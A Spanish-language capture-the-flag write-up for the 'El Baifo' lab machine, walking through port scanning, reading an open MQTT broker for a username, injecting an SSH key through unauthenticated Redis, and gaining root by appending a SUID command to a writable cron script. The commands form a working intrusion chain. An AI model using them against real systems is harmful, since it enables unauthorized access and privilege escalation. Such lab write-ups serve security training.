---
creator: nohh022
pubDatetime: 2026-08-8T01:00:00Z
title: El Baifo
slug: el-baifo
platform: The Hackers Labs
ogImage: ../../assets/images/thehackerslabs/el-baifo/el-baifo.jpg
featured: false
tags:
  - linux
  - mqtt
  - redis
  - crontab
description:
  Write up de la máquina El Baifo de la plataforma The Hackers Labs
---

![logo](../../assets/images/thehackerslabs/el-baifo/el-baifo.jpg)

## Table of contents

## Enumeración

La máquina El Baifo tiene la ip **10.0.2.67**

### Descubrimiento de Puertos

Vamos a empezar enumerando todos los puertos abiertos de la máquina, así como los servicios y las versiones que se están ejecutando en ellos mediante la herramienta **nmap**.

```bash
nmap -sS -p- --open -sCV --min-rate 5000 -n -Pn 10.0.2.67

Nmap scan report for 10.0.2.67
Host is up (0.00029s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE                  VERSION
22/tcp   open  ssh                      OpenSSH 9.2p1 Debian 2+deb12u9 (protocol 2.0)
| ssh-hostkey: 
|   256 2d:a5:4f:49:c9:4a:c0:94:d2:64:7f:67:9e:df:98:fa (ECDSA)
|_  256 7a:2a:af:2b:9e:e2:b6:9e:e6:60:b7:ce:ab:6d:39:bf (ED25519)
80/tcp   open  http                     Apache httpd 2.4.66 ((Debian))
|_http-server-header: Apache/2.4.66 (Debian)
|_http-title: El Baifo \xE2\x80\x94 Queser\xC3\xADa artesanal de Gran Canaria
1883/tcp open  mosquitto version 2.0.11
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     baifo/rebano/12/ubicacion: {"lat":27.9349,"lon":-15.4349}
|     $SYS/broker/load/bytes/received/1min: 933.79
|     $SYS/broker/load/publish/dropped/5min: 0.00
|     $SYS/broker/publish/bytes/received: 577
|     $SYS/broker/clients/inactive: 1
|     $SYS/broker/uptime: 27 seconds
|     baifo/rebano/19/actividad: pastando
|     $SYS/broker/bytes/received: 2027
|     $SYS/broker/load/bytes/received/5min: 200.70
|     baifo/rebano/14/temperatura: 38.3
|     baifo/rebano/14/actividad: en_movimiento
6379/tcp open  redis                    Redis key-value store 7.0.15
```

### Puerto 1883 (MQTT)

**Message Queuing Telemetry Transport** (**MQTT**) es un protocolo de mensajería que se utiliza para la comunicación entre un equipo y otro.

Vamos a conectarnos a él y enumerar todos sus **topics**, que son cadenas de texto que funcionan como etiquetas.

Para ello, instalamos `mosquitto` y `mosquitto-clients`

```bash
sudo apt install mosquitto mosquitto-clients
```

Una vez hecho, nos conectamos al servicio.

```bash
mosquitto_sub -h 10.0.2.67 -t "#" -v

baifo/rebano/07/temperatura 38.2
baifo/rebano/07/ubicacion {"lat":27.9283,"lon":-15.4283}
baifo/rebano/07/actividad reposo
baifo/rebano/12/temperatura 38.2
baifo/rebano/12/ubicacion {"lat":27.9283,"lon":-15.4283}
baifo/rebano/12/actividad reposo
baifo/rebano/14/temperatura 38.2
baifo/rebano/14/ubicacion {"lat":27.9283,"lon":-15.4283}
baifo/rebano/14/actividad pastando
baifo/rebano/19/temperatura 38.2
baifo/rebano/19/ubicacion {"lat":27.9283,"lon":-15.4283}
baifo/rebano/19/actividad pastando
baifo/rebano/23/temperatura 38.2
baifo/rebano/23/ubicacion {"lat":27.9283,"lon":-15.4283}
baifo/rebano/23/actividad reposo
baifo/sistemas/turno Encargado de turno: Antonio (pastor01) — revisión de collares OK
```

Averiguamos un usuario, **pastor01**.

### Puerto 6379 (Redis)

Redis es un almacén de estructura de datos en memoria y base de datos NoSQL de tipo clave-valor.

En este caso, nos podemos conectar sin proporcionar credenciales, por lo que nos aprovechamos de ello para intentar un **SSH Key Injection** utilizando el usuario descubierto en **MQTT**. 

De esta forma, podemos sobrescribir su archivo **authorized_keys** y obtener acceso mediante SSH.

## Explotación
### SSH Key Injection

Primero, creamos un par de llaves **SSH**.

```bash
ssh-keygen -t rsa -f pastor_key
```

```bash
ll
drwxrwxr-x kali kali 4.0 KB Sat Aug  8 05:12:52 2026  .
drwxrwxr-x kali kali 4.0 KB Sat Aug  8 03:55:55 2026  ..
.rw------- kali kali 2.5 KB Sat Aug  8 05:12:52 2026  pastor_key
.rw-r--r-- kali kali 563 B  Sat Aug  8 05:12:52 2026 󰌆 pastor_key.pub
```

Agregamos a la llave pública saltos de línea.

```bash
(echo -e "\n\n"; cat pastor_key.pub; echo -e "\n\n") > key.txt
```

Nos conectamos a redis y procedemos con la inyección de la llave pública dentro del directorio del usuario **pastor01**.

```bash
redis-cli -h 10.0.2.67 flushall

cat key.txt | redis-cli -h 10.0.2.67 -x set ssh_key

redis-cli -h 10.0.2.67 config set dbfilename authorized_keys

redis-cli -h 10.0.2.67 config set dir /home/pastor01/.ssh

redis-cli -h 10.0.2.67 save
```

## Acceso SSH
### Pastor01

Una vez hecho, nos conectamos por ssh como el usuario **pastor01** empleando la llave privada.

```bash
ssh -i pastor_key pastor01@10.0.2.67

pastor01@TheHackersLabs:~$ ls -la
total 28
drwxr-xr-x 3 pastor01 pastor01 4096 jul 28 14:51 .
drwxr-xr-x 4 root     root     4096 jul 28 10:09 ..
lrwxrwxrwx 1 pastor01 pastor01    9 jul 28 14:51 .bash_history -> /dev/null
-rw-r--r-- 1 pastor01 pastor01  220 abr 23  2023 .bash_logout
-rw-r--r-- 1 pastor01 pastor01 3552 jul 28 11:02 .bashrc
-rw-r--r-- 1 pastor01 pastor01  807 abr 23  2023 .profile
drwx------ 2 pastor01 pastor01 4096 ago  8 11:22 .ssh
-rw-r--r-- 1 pastor01 pastor01   35 jul 28 10:53 user.txt
```

## Escalada de Privilegios
### Root

Vamos a utilizar **pspy64** para ver las tareas que se ejecutan periódicamente en el server.

- https://github.com/dominicbreuker/pspy


```bash
pastor01@TheHackersLabs:~$ ./pspy64 
...
2026/08/08 10:30:01 CMD: UID=0     PID=4740   | /bin/sh -c /opt/baifo/scripts/backup-collares.sh 
...
```

El usuario **root** está ejecutando un script de bash situado en el directorio **opt**.

Revisando este script vemos que disponemos de permisos de escritura, por lo que vamos a hacer que le de permisos **SUID** a la bash.


```bash
pastor01@TheHackersLabs:~$ ls -la /opt/baifo/scripts/
total 12
drwxr-xr-x 2 root root     4096 jul 28 10:54 .
drwxr-xr-x 3 root root     4096 jul 28 10:54 ..
-rwxrwx--- 1 root pastor01  138 jul 28 11:01 backup-collares.sh
```

```bash
echo 'chmod u+s /bin/bash' >> /opt/baifo/scripts/backup-collares.sh 
```

Esperamos un poco para que la bash reciba los permisos y nos lanzamos una bash privilegiada `bash -p` para convertirnos en **root**.

```bash
pastor01@TheHackersLabs:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 sep  7  2025 /bin/bash

pastor01@TheHackersLabs:~$ bash -p
bash-5.2# whoami
root
bash-5.2# ls -la /root/
total 28
drwx------  4 root root 4096 jul 28 14:51 .
drwxr-xr-x 18 root root 4096 jul 28 14:52 ..
lrwxrwxrwx  1 root root    9 jul 28 14:51 .bash_history -> /dev/null
-rw-r--r--  1 root root  597 jul 28 11:02 .bashrc
drwxr-xr-x  3 root root 4096 oct 16  2024 .local
-rw-r--r--  1 root root  161 jul  9  2019 .profile
-rw-------  1 root root   28 jul 28 10:58 root.txt
drwx------  2 root root 4096 oct 16  2024 .ssh
```